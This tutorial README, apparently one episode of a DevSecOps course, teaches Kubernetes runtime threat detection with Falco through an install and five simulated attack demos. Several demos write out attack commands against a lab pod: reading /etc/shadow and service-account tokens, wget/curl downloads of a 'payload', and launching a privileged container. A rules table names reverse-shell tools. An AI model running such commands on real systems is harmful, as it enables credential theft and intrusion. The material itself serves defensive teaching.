# Episode 08 — Runtime Security

## 🎯 Episode Structure

| # | Topic | Focus |
|---|-------|-------|
| 1 | Runtime Security Introduction | Build-time vs Runtime, why it's needed |
| 2 | Common Runtime Attacks | Real attack scenarios companies face |
| 3 | Falco Architecture | How eBPF-based detection works |
| 4 | Install Falco (Live) | Production Helm deployment |
| 5 | Runtime Attack Detection (5 Demos) | Shell, packages, curl/wget, sensitive files, privileged |
| 6 | Custom Falco Rules | Write your own detection rules |
| 7 | Industry Runtime Security Stack | What companies actually use beyond Falco |

---

## 1️⃣ What is Runtime Security?

### Build-Time vs Runtime Security

| Phase | What You Do | Tools |
|-------|-------------|-------|
| **Build Time** | Scan code, images, dependencies BEFORE deployment | Trivy, SonarQube, Snyk, SAST |
| **Runtime** | Monitor and detect threats AFTER container is running | Falco, Tetragon, GuardDuty |

### Why Vulnerabilities Still Reach Production

```
Code Written → SAST Scan → Dependencies Scanned → Image Scanned → Deployed
                                                                      │
                                    ┌─────────────────────────────────┘
                                    ▼
                    STILL VULNERABLE BECAUSE:
                    • Zero-day vulnerabilities (unknown at scan time)
                    • Supply chain compromise (clean image → backdoored later)
                    • Misconfiguration (scan passed but runtime config is weak)
                    • Insider threats (legitimate access abused)
                    • Credential theft (attacker uses stolen keys)
```

### Why Runtime Security is Required

Build-time scanning gives you a **point-in-time check**. But:
- New CVEs are discovered daily — your deployed image becomes vulnerable after deployment
- Attackers don't need vulnerabilities — they use stolen credentials, misconfigurations
- You need to know if someone is **already inside** your container

> **Runtime Security = Your last line of defense.**
> If everything else fails, runtime detection catches the attacker.

---

## 2️⃣ Common Runtime Threats

These are the attacks companies actually face in production:

| # | Attack | What Happens | Real-World Example |
|---|--------|--------------|-------------------|
| 1 | **Shell Access** | Attacker gets interactive shell inside container | Log4Shell → RCE → shell |
| 2 | **Malware Download** | Attacker uses curl/wget to download tools | Crypto miner downloaded via wget |
| 3 | **Sensitive File Read** | Attacker reads /etc/shadow, AWS creds, SA tokens | Credential harvesting |
| 4 | **Package Installation** | Attacker installs tools (nmap, netcat) | Lateral movement preparation |
| 5 | **Container Escape** | Attacker breaks out of container to host | Privileged container + mount |
| 6 | **Privilege Escalation** | Attacker gains root or extra capabilities | setuid binary exploitation |
| 7 | **Reverse Shell** | Attacker creates outbound connection to C2 server | Backdoor persistence |
| 8 | **Crypto Mining** | Attacker uses your compute for mining | XMRig deployed in pod |

### Real Incident Flow (How Attacks Actually Happen)

```
┌─────────────────────────────────────────────────────────────────┐
│                    REAL ATTACK CHAIN                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. Application Running in Production                            │
│           │                                                       │
│           ▼                                                       │
│  2. Attacker Exploits Vulnerability (Log4Shell, RCE, SSRF)       │
│           │                                                       │
│           ▼                                                       │
│  3. Gets Shell Access (sh/bash spawned inside container)         │
│           │                     ← FALCO DETECTS HERE             │
│           ▼                                                       │
│  4. Reconnaissance (whoami, id, cat /etc/passwd)                 │
│           │                     ← FALCO DETECTS HERE             │
│           ▼                                                       │
│  5. Downloads Tools (wget/curl malware from C2 server)           │
│           │                     ← FALCO DETECTS HERE             │
│           ▼                                                       │
│  6. Privilege Escalation / Lateral Movement                      │
│           │                     ← FALCO DETECTS HERE             │
│           ▼                                                       │
│  7. Data Exfiltration / Crypto Mining / Persistence              │
│           │                     ← FALCO DETECTS HERE             │
│           ▼                                                       │
│  8. Alert Generated → Security Team Responds                    │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘

WITHOUT Runtime Security: Attacker operates UNDETECTED for days/weeks
WITH Runtime Security:    Attacker detected at Step 3 (within seconds)
```

---

## 3️⃣ Falco Architecture

### What is Falco?

- **CNCF Graduated Project** (same level as Kubernetes, Prometheus)
- Created by Sysdig, maintained by community
- Used by: Shopify, GitLab, Skyscanner, many banks
- Detects suspicious behavior inside containers in **real-time**

### How Falco Works

```
┌──────────────────────────────────────────────────────────────┐
│                     LINUX KERNEL                               │
│  Every process makes system calls: open(), exec(), connect() │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             │ eBPF (efficient, no kernel module needed)
                             ▼
┌──────────────────────────────────────────────────────────────┐
│                    FALCO ENGINE                                │
│                                                               │
│  1. Captures ALL syscall events from containers               │
│  2. Filters events through RULES                              │
│  3. If rule matches → generates ALERT                         │
│                                                               │
│  Example:                                                     │
│  Event: proc.name=bash, container=webapp                      │
│  Rule:  "shell spawned in container" → MATCH                  │
│  Alert: "SHELL ACCESS DETECTED in webapp pod"                 │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│                 FALCO SIDEKICK                                 │
│  Routes alerts to: Slack, PagerDuty, Teams, Kafka, SIEM      │
└──────────────────────────────────────────────────────────────┘
```

### Why eBPF?

| Old Way (Kernel Module) | New Way (eBPF) |
|---|---|
| Requires kernel module installation | No kernel module needed |
| Can crash the kernel | Runs in sandbox — can't crash kernel |
| Needs kernel headers | Works without kernel headers |
| Doesn't work on managed K8s (EKS/GKE) | Works on EKS, GKE, AKS |

### Falco Deployment Model

```
┌─────────────────────────────────────────────────────────────┐
│                   KUBERNETES CLUSTER                          │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                  │
│  │  Node 1  │  │  Node 2  │  │  Node 3  │                  │
│  │          │  │          │  │          │                  │
│  │ [Falco]  │  │ [Falco]  │  │ [Falco]  │  ← DaemonSet    │
│  │ [Pod A]  │  │ [Pod B]  │  │ [Pod C]  │                  │
│  │ [Pod D]  │  │ [Pod E]  │  │ [Pod F]  │                  │
│  └──────────┘  └──────────┘  └──────────┘                  │
│                                                              │
│  Falco runs as DaemonSet = one Falco pod per node           │
│  Monitors ALL pods on that node via eBPF                     │
└─────────────────────────────────────────────────────────────┘
```

### Falco Rules Structure

Every Falco rule has 4 parts:

```yaml
- rule: <NAME>           # What to call this detection
  desc: <DESCRIPTION>    # What it detects
  condition: <FILTER>    # WHEN to trigger (syscall filter expression)
  output: <MESSAGE>      # WHAT to report (alert message with context)
  priority: <LEVEL>      # How severe (EMERGENCY, CRITICAL, ERROR, WARNING, NOTICE, INFO, DEBUG)
  tags: [...]            # Categories for filtering
```

**Condition Language Examples:**
| Condition | Meaning |
|---|---|
| `spawned_process and container` | Any new process started inside a container |
| `open_read and fd.name = /etc/shadow` | File /etc/shadow was opened for reading |
| `proc.name in (curl, wget)` | Process name is curl or wget |
| `container.privileged = true` | Container running in privileged mode |
| `open_write and fd.name startswith /usr/bin` | Write to binary directory |

---

## 4️⃣ Install Falco (Live Demo)

### Prerequisites
- Kubernetes cluster (minikube/kind/EKS/GKE)
- Helm 3 installed

### Installation

```bash
# One-command installation
cd 01-falco-production/
bash install.sh
```

Or manually:

```bash
# Add Helm repo
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install with production values
helm upgrade --install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --values values-production.yaml \
  --wait --timeout 5m

# Verify
kubectl get pods -n falco
kubectl get daemonset -n falco
```

### Verify Falco is Running

```bash
# Check Falco pods (should be 1 per node)
kubectl get pods -n falco -o wide

# Check Falco logs (should see "Falco initialized" message)
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=5

# Access Sidekick Web UI
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
# Open browser: http://localhost:2802
# Login → User: admin | Password: admin
```

---

## 5️⃣ Runtime Attack Detection — 5 Hands-On Demos

### Run the Full Simulation

```bash
cd 01-falco-production/
bash attack-simulation.sh
```

**Setup:** Open 2 terminals
- Terminal 1: Run attack commands
- Terminal 2: `kubectl logs -n falco -l app.kubernetes.io/name=falco -f`

### Demo 1: Detect Shell Access Inside Container

**Scenario:** Attacker exploits a vulnerability (Log4Shell, RCE, SSRF) and gets shell access.

```bash
# Deploy target pod
kubectl run victim-pod --image=alpine:3.18 -- sleep 3600

# Attacker gets shell (simulates RCE exploit)
kubectl exec victim-pod -- sh -c "whoami && id && hostname"
```

**Falco Alert:**
```
SHELL ACCESS DETECTED
(container=victim-pod shell=sh parent=runc cmdline=sh -c whoami && id && hostname)
```

**Why it matters:** Shell access = full control. Attacker can now read files, download malware, move laterally.

---

### Demo 2: Detect Package Installation

**Scenario:** Attacker installs tools (nmap, netcat, curl) to scan network and pivot.

```bash
# Attacker installs reconnaissance tools
kubectl exec victim-pod -- apk add --no-cache nmap
```

**Falco Alert:**
```
PACKAGE MANAGER EXECUTED (container drift)
(command=apk add --no-cache nmap container=victim-pod)
```

**Why it matters:** Production containers are IMMUTABLE. Any package install = container drift = compromise indicator.

---

### Demo 3: Detect Curl/Wget Download

**Scenario:** After gaining access, attacker downloads malware, crypto miners, or C2 agents.

```bash
# Attacker downloads malware
kubectl exec victim-pod -- wget -q http://example.com -O /tmp/payload

# Attacker downloads C2 agent
kubectl exec victim-pod -- curl -s -o /tmp/agent http://example.com
```

**Falco Alert:**
```
DOWNLOAD TOOL USED IN CONTAINER
(command=wget -q http://example.com -O /tmp/payload container=victim-pod)
```

**Why it matters:** Legitimate containers should NEVER download files at runtime. This is the #1 indicator of crypto mining attacks.

---

### Demo 4: Detect Sensitive File Access

**Scenario:** Attacker reads credential files to steal passwords, tokens, or keys.

```bash
# Read password hashes
kubectl exec victim-pod -- cat /etc/shadow

# Read Kubernetes API token (used to access cluster)
kubectl exec victim-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
```

**Falco Alert:**
```
CREDENTIAL ACCESS ATTEMPT
(file=/etc/shadow container=victim-pod)

SERVICE ACCOUNT TOKEN ACCESSED
(container=victim-pod process=cat)
```

**Why it matters:**
- SA token → attacker can talk to Kubernetes API, list pods, create new pods
- /etc/shadow → offline password cracking
- AWS creds → access your entire cloud account

---

### Demo 5: Detect Privileged Container Activity

**Scenario:** A misconfigured or malicious workload runs as privileged (full host access).

```bash
# Launch privileged container
kubectl run privileged-pod --image=alpine:3.18 \
  --overrides='{"spec":{"containers":[{"name":"privileged-pod","image":"alpine:3.18","command":["sleep","120"],"securityContext":{"privileged":true}}]}}'

# Show WHY it's dangerous — can see all host devices
kubectl exec privileged-pod -- ls /dev | head -15

# Can access host filesystem
kubectl exec privileged-pod -- mount | head -5
```

**Falco Alert:**
```
PRIVILEGED CONTAINER LAUNCHED
(container=privileged-pod image=alpine:3.18)
```

**Why it matters:**
- Privileged = container has ALL Linux capabilities
- Can mount host filesystem → read any file on the node
- Can load kernel modules → compromise the entire host
- Container escape is **trivial** from privileged containers
- This should NEVER exist in production (Pod Security Standards block it)

---

### View All Alerts

```bash
# All alerts in terminal
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50

# Filter by severity
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "CRITICAL"

# Sidekick Web UI (visual dashboard)
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
```

### Detection Summary

| Demo | Attack | Falco Alert | Priority |
|------|--------|-------------|----------|
| 1 | Shell access | SHELL ACCESS DETECTED | WARNING |
| 2 | Package install | PACKAGE MANAGER EXECUTED | ERROR |
| 3 | Curl/Wget download | DOWNLOAD TOOL USED | WARNING |
| 4 | Sensitive file read | CREDENTIAL ACCESS ATTEMPT | CRITICAL |
| 5 | Privileged container | PRIVILEGED CONTAINER LAUNCHED | CRITICAL |

---

## 6️⃣ Custom Falco Rules

### Why Custom Rules Matter

Default Falco rules are generic. Your company has specific threats:
- Your app shouldn't make outbound HTTP calls? Write a rule.
- Only your deployment tool should create pods? Write a rule.
- Your app should never read /tmp? Write a rule.

### Rule Structure

```yaml
- rule: <name>
  desc: <what it detects>
  condition: <when to alert — syscall filter>
  output: <alert message with context variables>
  priority: <severity level>
  tags: [<categories>]
```

### Example: Write a Custom Rule

**Scenario:** Your production app should NEVER make outbound HTTP connections. If it does → something is wrong.

```yaml
- rule: Unauthorized Outbound Connection
  desc: Detect outbound network connections from production app
  condition: >
    outbound and
    container and
    k8s.ns.name = production and
    not proc.name in (node, java, python3)
  output: >
    UNAUTHORIZED OUTBOUND CONNECTION
    (process=%proc.name connection=%fd.name container=%container.name
     pod=%k8s.pod.name namespace=%k8s.ns.name)
  priority: ERROR
  tags: [container, network, data_exfiltration]
```

### How to Add Custom Rules

Custom rules go in `values-production.yaml` under `customRules`:

```yaml
customRules:
  custom-rules.yaml: |-
    - rule: Your Custom Rule
      desc: What it does
      condition: >
        spawned_process and container and proc.name = "suspicious-binary"
      output: >
        ALERT MESSAGE (container=%container.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [custom]
```

Then apply:
```bash
helm upgrade falco falcosecurity/falco -n falco --values values-production.yaml
```

### Test Your Custom Rule

```bash
# Trigger the rule
kubectl exec attack-target -- <command that matches your condition>

# Check if Falco caught it
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=5
```

### All 9 Rules in This Repo

| # | Rule | Detects | Priority |
|---|------|---------|----------|
| 1 | Shell Spawned in Container | bash/sh/zsh execution | WARNING |
| 2 | Sensitive File Read | /etc/shadow, SA token, SSH keys | CRITICAL |
| 3 | Crypto Mining Process | xmrig, stratum+tcp connections | CRITICAL |
| 4 | Package Manager in Production | apt/yum/apk/pip/npm usage | ERROR |
| 5 | Write to Binary Directory | Writes to /usr/bin, /bin | CRITICAL |
| 6 | Reverse Shell | /dev/tcp, netcat -e, python socket | CRITICAL |
| 7 | Service Account Token Read | SA token file access | WARNING |
| 8 | Curl/Wget Download | curl/wget execution | WARNING |
| 9 | Privileged Container Started | container.privileged=true | CRITICAL |

---

## 7️⃣ Industry Runtime Security Stack

### What Companies Actually Use

| Category | Tool | Who Uses It | Open Source? |
|----------|------|-------------|---|
| **Runtime Detection** | Falco | Most K8s companies | ✅ Yes (CNCF) |
| **Runtime Visibility** | Tetragon | Companies needing deep eBPF observability | ✅ Yes (CNCF) |
| **Endpoint Security** | CrowdStrike Falcon | Enterprise (banks, healthcare) | ❌ Commercial |
| **Endpoint Security** | SentinelOne | Enterprise | ❌ Commercial |
| **Cloud Runtime** | AWS GuardDuty | AWS customers | ❌ AWS managed |
| **Cloud Runtime** | Microsoft Defender for Cloud | Azure customers | ❌ Azure managed |
| **Cloud Runtime** | GCP Security Command Center | GCP customers | ❌ GCP managed |
| **Container Security Platform** | Aqua Security | Enterprise K8s | ❌ Commercial |
| **Container Security Platform** | Sysdig Secure | Enterprise K8s (Falco creators) | ❌ Commercial |

### Falco vs Tetragon

| Feature | Falco | Tetragon |
|---------|-------|----------|
| Focus | Detection & alerting | Observability & enforcement |
| CNCF Status | Graduated | Sandbox (Incubating) |
| Created by | Sysdig | Isovalent (Cilium team) |
| Approach | Rules-based alerting | Policy-based enforcement |
| Can BLOCK attacks? | ❌ No (detect only) | ✅ Yes (can kill process) |
| Best for | "Detect and alert" | "Detect and prevent" |
| Maturity | Production-ready | Growing rapidly |

### What I Recommend (for DevSecOps teams)

```
Small Team / Startup:
  → Falco (free, covers 90% of detection needs)

Mid-size Company:
  → Falco + Falco Sidekick (Slack/PagerDuty alerts)
  → Pod Security Standards (built into K8s)

Enterprise:
  → Falco + Sysdig Secure (commercial support)
  → OR CrowdStrike/SentinelOne (endpoint protection)
  → + AWS GuardDuty / Azure Defender (cloud-native)
  → + SIEM integration (Splunk, ELK, Datadog)
```

### How Companies Integrate Falco in Production

```
┌─────────────────────────────────────────────────────────────┐
│                 PRODUCTION SETUP                              │
│                                                              │
│  Falco (DaemonSet on every node)                            │
│       │                                                      │
│       ▼                                                      │
│  Falco Sidekick (alert router)                              │
│       │                                                      │
│       ├──→ Slack (#security-alerts channel)                  │
│       ├──→ PagerDuty (on-call engineer paged for CRITICAL)  │
│       ├──→ Kafka (for long-term storage & analytics)        │
│       ├──→ Elasticsearch/SIEM (correlation with other logs) │
│       └──→ AWS Security Hub / Azure Sentinel                │
│                                                              │
│  Response:                                                   │
│    WARNING  → Slack notification, security team reviews      │
│    ERROR    → Slack + ticket auto-created                    │
│    CRITICAL → PagerDuty page + auto-isolate pod (optional)  │
└─────────────────────────────────────────────────────────────┘
```

---

## 🧹 Cleanup

```bash
# Remove attack pods
kubectl delete pod victim-pod 2>/dev/null
kubectl delete pod privileged-pod 2>/dev/null

# Uninstall Falco
cd 01-falco-production/
bash uninstall.sh
```

---

## 📋 Runtime Security Checklist

- [ ] Deploy Falco (or equivalent) on all clusters
- [ ] Custom rules for your specific application behavior
- [ ] Alert routing to Slack/PagerDuty for CRITICAL detections
- [ ] Incident response runbook for each alert type
- [ ] Regular rule tuning (reduce false positives)
- [ ] Combine with prevention (Pod Security Standards — covered in Episode 06)
- [ ] Combine with hardened containers (non-root, read-only — covered in Episode 05)

---

## 📂 Files in This Folder

```
01-falco-production/
├── install.sh                 ← One-command Falco setup
├── uninstall.sh               ← Clean removal
├── values-production.yaml     ← Helm values with 9 custom detection rules
└── attack-simulation.sh       ← 5 attack demos to run live (shell, packages, wget, files, privileged)
```

---

## 📚 Resources

- [Falco Documentation](https://falco.org/docs/)
- [Falco Rules Reference](https://falco.org/docs/rules/supported-fields/)
- [Tetragon Documentation](https://tetragon.io/docs/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [AWS GuardDuty for EKS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_eks.html)
